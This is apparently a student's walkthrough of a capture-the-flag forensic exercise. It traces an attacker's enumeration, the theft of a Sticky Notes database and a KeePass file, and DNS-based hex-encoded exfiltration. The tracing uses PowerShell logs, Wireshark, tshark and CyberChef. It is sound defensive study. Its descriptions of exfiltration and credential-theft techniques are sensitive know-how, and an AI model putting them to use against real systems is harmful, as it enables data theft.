+</p><ul id="2495b2cc-075b-804f-8005-d1ef99cfbd91" class="bulleted-list"><li style="list-style-type:disc">What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)<br/><br/>I opened the pcap and looked at the resolved addresses.</li></ul><figure id="2495b2cc-075b-806e-9e91-c5cbf2796ca7" class="image"><a href="8647E1C8-D961-47E7-9497-79622F8549CD.png"><img style="width:692px" src="8647E1C8-D961-47E7-9497-79622F8549CD.png"/></a></figure><ul id="2495b2cc-075b-8019-9f9b-f118a0eb310f" class="bulleted-list"><li style="list-style-type:disc">What is the name of the enumeration tool downloaded by the attacker?<br/><br/>I used the jq tool to read throught the logs that has been formatted to json. From the given logs, I learned that scriptblock text contains information such as domains and executables ran, then i used the jq tool to sort by timestamp, then only extract from the scriptblocktext key. then sorted and uniq to only get unique values. by doing this, I found an enumeration tool called Seatbelt.exe being ran, </li></ul><figure id="2495b2cc-075b-80f5-9151-d30338666a72" class="image"><a href="AEB874CD-E571-40DD-93D3-CB8AFE1E8E05.png"><img style="width:2188px" src="AEB874CD-E571-40DD-93D3-CB8AFE1E8E05.png"/></a></figure><figure id="2495b2cc-075b-80ec-af5d-f478d0c16148" class="image"><a href="A82582A1-22F9-4D7F-A564-59BC193E58E9.png"><img style="width:691.88330078125px" src="A82582A1-22F9-4D7F-A564-59BC193E58E9.png"/></a></figure><ul id="2495b2cc-075b-806d-98a0-f2f3d6c4ceb2" class="bulleted-list"><li style="list-style-type:disc">What is the file accessed by the attacker using the downloaded <strong>sq3.exe </strong>binary? Provide the full file path with escaped backslashes.<br/><br/>I used the same command to look for the sq3.exe command being used, and i found this</li></ul><p id="2495b2cc-075b-8028-9b38-f31f5b3a66da" class=""><code>C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite</code><br/></p><figure id="2495b2cc-075b-806f-a3d5-d9a4ae52058b" class="image"><a href="B9DEE41A-B3F6-4BAB-99F5-53C4BDA3DA88.png"><img style="width:692px" src="B9DEE41A-B3F6-4BAB-99F5-53C4BDA3DA88.png"/></a></figure><ul id="2495b2cc-075b-80e8-90a8-d949b44ce69e" class="bulleted-list"><li style="list-style-type:disc">What is the software that uses the file in Q3?<br/> <br/>Microsoft Stickey Notes</li></ul><p id="2495b2cc-075b-80d4-9aad-ed0bc8bc2863" class="">
+</p><ul id="2495b2cc-075b-8075-b794-cb1921168930" class="bulleted-list"><li style="list-style-type:disc">What is the name of the exfiltrated file?<br/><br/>This is seen in the scriptblocktext where a file is sent to a destination<br/></li></ul><figure id="2495b2cc-075b-8043-94d1-c37c85e1c34e" class="image"><a href="43396AD0-D9AB-49D6-9350-937D7DBF2566.png"><img style="width:692px" src="43396AD0-D9AB-49D6-9350-937D7DBF2566.png"/></a></figure><p id="2495b2cc-075b-80bd-bb58-dc16ebbdda3c" class="">
+</p><ul id="2495b2cc-075b-80d8-ab7d-e95ef32408dd" class="bulleted-list"><li style="list-style-type:disc">What type of file uses the .kdbx file extension?<br/></li></ul><figure id="2495b2cc-075b-802a-a029-da3297ebc9fc" class="image"><a href="E37C8211-57EA-4C32-B445-F874020499D7.png"><img style="width:691.9833374023438px" src="E37C8211-57EA-4C32-B445-F874020499D7.png"/></a></figure><p id="2495b2cc-075b-8016-84a3-e6ae25cc2b75" class="">
+</p><ul id="2495b2cc-075b-80e9-a11c-f72a3d93798e" class="bulleted-list"><li style="list-style-type:disc">What is the encoding used during the exfiltration attempt of the sensitive file?<br/><br/>It was converted into hex as seen from here</li></ul><figure id="2495b2cc-075b-8077-988c-d05b40f7aa4b" class="image"><a href="00DA0FF9-204E-482F-8576-BD0264CFF977.png"><img style="width:692px" src="00DA0FF9-204E-482F-8576-BD0264CFF977.png"/></a></figure><ul id="2495b2cc-075b-80ef-98c2-caadd6f003d0" class="bulleted-list"><li style="list-style-type:disc">What is the tool used for exfiltration?<br/>nslookup - HOLYMOLY</li></ul><figure id="2495b2cc-075b-8063-a0ad-cf5b490e2f0e" class="image"><a href="176DD8A9-1C81-4092-9B9C-B023CF2B0E0B.png"><img style="width:692px" src="176DD8A9-1C81-4092-9B9C-B023CF2B0E0B.png"/></a></figure><p id="2495b2cc-075b-8075-8c91-f9a028144260" class="">
+</p><p id="2495b2cc-075b-80ed-aa2b-dabab468bc32" class="">
+</p><h2 id="2495b2cc-075b-80f1-a99f-dcd53bd5a06c" class="">[Network Traffic Analysis] They got us. Call the bank immediately!</h2><p id="2495b2cc-075b-8099-b3f0-c9f1f790011e" class="">
+</p><p id="2495b2cc-075b-8005-8eba-dc1360c5983f" class="">Based on the PowerShell logs investigation, we have seen the full impact of the attack:</p><ul id="2495b2cc-075b-806c-bbc1-f069562010c4" class="bulleted-list"><li style="list-style-type:disc">The threat actor was able to read and exfiltrate two potentially sensitive files.</li></ul><ul id="2495b2cc-075b-80b0-9acf-fd52976ee1e9" class="bulleted-list"><li style="list-style-type:disc">The domains and ports used for the network activity were discovered, including the tool used by the threat actor for exfiltration.</li></ul><h3 id="2495b2cc-075b-8058-8667-d4db86d255b7" class="">Investigation Guide</h3><p id="2495b2cc-075b-809d-aef6-c21cdf31d2ab" class="">Finally, we can complete the investigation by understanding the network traffic caused by the attack:</p><ul id="2495b2cc-075b-805e-8a57-d3c7f0aadb5d" class="bulleted-list"><li style="list-style-type:disc">Utilise the domains and ports discovered from the previous task.</li></ul><ul id="2495b2cc-075b-8054-abb2-f9f4eeb23ca4" class="bulleted-list"><li style="list-style-type:disc">All commands executed by the attacker and all command outputs were logged and stored in the packet capture.</li></ul><ul id="2495b2cc-075b-80d9-84bc-f1389e45586b" class="bulleted-list"><li style="list-style-type:disc">Follow the streams of the notable commands discovered from PowerShell logs.</li></ul><ul id="2495b2cc-075b-8036-add3-fdf2c55adce8" class="bulleted-list"><li style="list-style-type:disc">Based on the PowerShell logs, we can retrieve the contents of the exfiltrated data by understanding how it was encoded and extracted.</li></ul><p id="2495b2cc-075b-8084-bec1-fe474f382b5f" class=""><br/>Questions<br/></p><ul id="2495b2cc-075b-80a9-9047-fb4cc3bbba13" class="bulleted-list"><li style="list-style-type:disc">What software is used by the attacker to host its presumed file/payload server?<br/></li></ul><p id="2495b2cc-075b-8077-8573-f69b22510f46" class="">I used wireshark with filter ip.dst with the destination address previously identified, then i followed the tcp stream and found the following</p><figure id="2495b2cc-075b-8041-8cf9-f365f2205a91" class="image"><a href="image%20317.png"><img style="width:692px" src="image%20317.png"/></a></figure><ul id="2495b2cc-075b-8018-b1f7-e3789d0a9997" class="bulleted-list"><li style="list-style-type:disc">What HTTP method is used by the C2 for the output of the commands executed by the attacker?<br/><br/>We can take a guess that its HTTP POST to send data out, but from wireshark, if you filter by the domain indentified earlier, I was able to see POST requests<br/></li></ul><figure id="2495b2cc-075b-8059-9aad-d85ea1921595" class="image"><a href="39C73F01-9FD4-4DF0-A668-61B114A5B6CC.png"><img style="width:644.9833374023438px" src="39C73F01-9FD4-4DF0-A668-61B114A5B6CC.png"/></a></figure><p id="2495b2cc-075b-8021-9531-d767e3010320" class="">
+</p><ul id="2495b2cc-075b-80c4-966b-c73e03df59b7" class="bulleted-list"><li style="list-style-type:disc">What is the protocol used during the exfiltration activity?<br/><br/>DNS - We have identified this earlier, that DNS was used to exfiltrate the stolen stuff using broken down DNS queries.<br/></li></ul><ul id="2495b2cc-075b-8065-9d39-d778cb98c3e6" class="bulleted-list"><li style="list-style-type:disc">What is the password of the exfiltrated file</li></ul><p id="2495b2cc-075b-80ed-b96e-eed4a333e51f" class="">In the previous task, there was a “ScriptBlockText” where the binary “sq3.exe” was used to access “plum.sqlite”. It can be also be seen that the attacker was able to retrieve records from the table “NOTE” which may also include credentials and one of them could be that password for the exfiltrated file.</p><p id="2495b2cc-075b-80b1-a385-c822012afb8b" class="">Filter in Wireshark packets with HTTP with a keyword containing the binary used to enumerate the SQLite database.</p><figure id="2495b2cc-075b-8079-a653-de6ae8a76613" class="image"><a href="https://miro.medium.com/v2/resize:fit:1167/0*RPPUMq06TGia_jJs"><img style="width:700px" src="https://miro.medium.com/v2/resize:fit:1167/0*RPPUMq06TGia_jJs"/></a></figure><p id="2495b2cc-075b-80c9-900b-dfee5089a4d5" class="">Follow the TCP stream. We see the SQL command used to retrieve the data from <br/>the table “NOTE”. Note that stream is at packet 749.</p><figure id="2495b2cc-075b-80b2-9161-e99ea5ce8260" class="image"><a href="https://miro.medium.com/v2/resize:fit:1167/0*YkaOoCT-qbg7DRFq"><img style="width:700px" src="https://miro.medium.com/v2/resize:fit:1167/0*YkaOoCT-qbg7DRFq"/></a></figure><p id="2495b2cc-075b-8054-a4ac-c6beda974783" class="">Change stream to the next to 750 to see what happens to the data exfiltrated. We see a bunch of numbers. I copied the characters and pasted them in Cyberchef to be decoded.</p><figure id="2495b2cc-075b-803f-83d8-cdf6aa9700d9" class="image"><a href="https://miro.medium.com/v2/resize:fit:1167/0*ZaatBsI6ptX2Tuuk"><img style="width:700px" src="https://miro.medium.com/v2/resize:fit:1167/0*ZaatBsI6ptX2Tuuk"/></a></figure><p id="2495b2cc-075b-80e4-a734-db8ffb9cf5d8" class="">I used “Magic” to initially identify what type of characters they were.</p><figure id="2495b2cc-075b-80bb-abcb-c6291cf82fb8" class="image"><a href="https://miro.medium.com/v2/resize:fit:1167/0*fna4jSEapgL1WCfa"><img style="width:700px" src="https://miro.medium.com/v2/resize:fit:1167/0*fna4jSEapgL1WCfa"/></a></figure><p id="2495b2cc-075b-8070-bea4-e37b1f2a0d95" class="">Using “From Decimal” as the recipe, the master password for the exfiltrated file is now retrieved.</p><figure id="2495b2cc-075b-80ba-a7ba-caed3469dc8b" class="image"><a href="https://miro.medium.com/v2/resize:fit:1167/0*6y8aNDWP4hZKrbow"><img style="width:700px" src="https://miro.medium.com/v2/resize:fit:1167/0*6y8aNDWP4hZKrbow"/></a></figure><ul id="2495b2cc-075b-802e-9443-d1593a954733" class="bulleted-list"><li style="list-style-type:disc">What is the credit card number stored inside the exfiltrated file?<br/><br/></li></ul><p id="2495b2cc-075b-804f-85b4-f7b6837980ff" class="">Using Wireshark at first, I built a display filter that utilizes the info we got from the previous task: <code>nslookup -q=A</code>. This can be done by going to <strong>&quot;Analyze &gt; Display Filter Expressions&quot;</strong>.</p><p id="2495b2cc-075b-80d7-a1d8-c847171e9c87" class="">
+</p><figure id="2495b2cc-075b-80ee-8c77-dcd114402756" class="image"><a href="https://miro.medium.com/v2/resize:fit:1167/0*pPKDqZ8ob1vNh3Ax"><img style="width:700px" src="https://miro.medium.com/v2/resize:fit:1167/0*pPKDqZ8ob1vNh3Ax"/></a></figure><p id="2495b2cc-075b-8060-a98e-c30a20f7298e" class="">Added to the filter is the destination IP of the exfiltrated file.</p><p id="2495b2cc-075b-8032-a7dc-cc7b87f07d3b" class="">
+</p><figure id="2495b2cc-075b-80b1-b0a5-e4c4a062100f" class="image"><a href="https://miro.medium.com/v2/resize:fit:1167/0*4QtHRt6YpgVeUY4e"><img style="width:700px" src="https://miro.medium.com/v2/resize:fit:1167/0*4QtHRt6YpgVeUY4e"/></a></figure><p id="2495b2cc-075b-8011-80f9-f866ea153ac9" class="">We see a lot of results with a bunch of characters similar to the previous question. As seen in the command used to exfiltrate the data, the file is being split using a DNS nslookup query.</p><p id="2495b2cc-075b-800e-9eef-e8b9cf8d2c8f" class="">Wireshark proved to be difficult in parsing the data, so I used “tshark” as suggested to analyze the captured DNS traffic and extract only the <br/>encoded data being exfiltrated.</p><p id="2495b2cc-075b-80d3-aa81-ff10533758a0" class="">This command will read from the pcap file provided, apply “dns” as a display filter, and display packets that only include the DNS query name field. It will then grep lines that contain a keyword associated with the destination domain.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2495b2cc-075b-8009-9b5e-dbb2b9d43288" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">tshark -r capture.pcapng  -Y &#x27;dns&#x27; -T fields -e dns.qry.name |grep &quot;.bpakcaging.xyz&quot;</code></pre><figure id="2495b2cc-075b-8024-988d-d6d6df27a389" class="image"><a href="https://miro.medium.com/v2/resize:fit:1167/0*pTQoJSE0YvW-Q7nx"><img style="width:700px" src="https://miro.medium.com/v2/resize:fit:1167/0*pTQoJSE0YvW-Q7nx"/></a></figure><p id="2495b2cc-075b-805f-9954-d7edfb81878c" class="">We see duplicates and unnecessary strings or characters in the result, so we need to clean the result further.</p><p id="2495b2cc-075b-80b8-b4e7-c78e498b4591" class="">The command was modified to include additional commands that will split each line by the delimiter “.” and select only the first field or column. It will then perform an inverse match for “files” and “cdn”, meaning that they will not be included in the result. Finally, it will remove any duplicates.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2495b2cc-075b-807b-bf13-c5183f2806a1" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">tshark -r capture.pcapng  -Y &#x27;dns&#x27; -T fields -e dns.qry.name |grep &quot;.bpakcaging.xyz&quot; | cut -f1 -d &#x27;.&#x27;|grep -v -e &quot;files&quot; -e &quot;cdn&quot; | uniq</code></pre><p id="2495b2cc-075b-80ee-aa37-f44e4d04da58" class="">
+</p><figure id="2495b2cc-075b-8032-aa97-f4eef5f8be49" class="image"><a href="https://miro.medium.com/v2/resize:fit:1167/0*Gchw0O59MTx8-h-x"><img style="width:700px" src="https://miro.medium.com/v2/resize:fit:1167/0*Gchw0O59MTx8-h-x"/></a></figure><p id="2495b2cc-075b-80e0-ab1b-fe4c1f2cab46" class="">We need to remove empty spaces or newlines, so we use “tr” to make the output in one line of text.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2495b2cc-075b-8028-bca1-dabb2454e29a" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">tshark -r capture.pcapng  -Y &#x27;dns&#x27; -T fields -e dns.qry.name |grep &quot;.bpakcaging.xyz&quot; | cut -f1 -d &#x27;.&#x27;|grep -v -e &quot;files&quot; -e &quot;cdn&quot; | uniq | tr -d &#x27;\\n&#x27;</code></pre><figure id="2495b2cc-075b-8081-a615-d6694a9b48d0" class="image"><a href="https://miro.medium.com/v2/resize:fit:1167/0*pHRCcCUvLWAG4_o2"><img style="width:700px" src="https://miro.medium.com/v2/resize:fit:1167/0*pHRCcCUvLWAG4_o2"/></a></figure><p id="2495b2cc-075b-807a-88df-cce93108f9cb" class="">We can also save the result into a text file.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2495b2cc-075b-805b-aa26-dd7b9d16ccdf" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">tshark -r capture.pcapng  -Y &#x27;dns&#x27; -T fields -e dns.qry.name |grep &quot;.bpakcaging.xyz&quot; | cut -f1 -d &#x27;.&#x27;|grep -v -e &quot;files&quot; -e &quot;cdn&quot; | uniq | tr -d &#x27;\\n&#x27; &gt; extracted.txt</code></pre><p id="2495b2cc-075b-80a9-b182-fcd14e00df7d" class="">Or just copy and paste the strings in CyberChef.</p><figure id="2495b2cc-075b-80e5-92a3-c547a80c1ae7" class="image"><a href="https://miro.medium.com/v2/resize:fit:1167/0*Ul6xcFrWgCPd_Fir"><img style="width:700px" src="https://miro.medium.com/v2/resize:fit:1167/0*Ul6xcFrWgCPd_Fir"/></a></figure><p id="2495b2cc-075b-80e7-a8cf-cf81592e9d98" class="">Use “From Hex” to decode the strings.</p><p id="2495b2cc-075b-80ac-9db5-e869acf8f06c" class="">The result is just jumble of text or strings. Save the output to a file instead.</p><p id="2495b2cc-075b-80ed-9783-d6b6e005eaa1" class="">This now is a copy of the exfiltrated file.</p><p id="2495b2cc-075b-80b3-807b-c66306dd51f7" class="">Press enter or click to view image in full size</p><figure id="2495b2cc-075b-807b-a975-f7e24e925cd6" class="image"><a href="https://miro.medium.com/v2/resize:fit:1167/0*4paK1ZTEbYbe_S0b"><img style="width:700px" src="https://miro.medium.com/v2/resize:fit:1167/0*4paK1ZTEbYbe_S0b"/></a></figure><p id="2495b2cc-075b-8085-a784-fa1bcc802120" class="">With the master password retrieved, we can open the database and see what’s inside.</p><p id="2495b2cc-075b-802c-aa9e-f72d49875698" class="">Press enter or click to view image in full size</p><figure id="2495b2cc-075b-8032-8fe6-f9e8b756d56e" class="image"><a href="https://miro.medium.com/v2/resize:fit:1167/0*Q7kNU-n8Qt4tZV8M"><img style="width:700px" src="https://miro.medium.com/v2/resize:fit:1167/0*Q7kNU-n8Qt4tZV8M"/></a></figure><p id="2495b2cc-075b-80e5-aaad-e7c4ee6b8d49" class="">Look around the database until we find the account number being asked.</p><figure id="2495b2cc-075b-80f4-9a6a-f3e58de6173d" class="image"><a href="DB77B077-C9FC-4FF8-B1A1-135578FEBC8E.png"><img style="width:645px" src="DB77B077-C9FC-4FF8-B1A1-135578FEBC8E.png"/></a></figure><p id="2495b2cc-075b-809b-8cc0-f007192a5a59" class="">I found the card number within the keepass file.</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
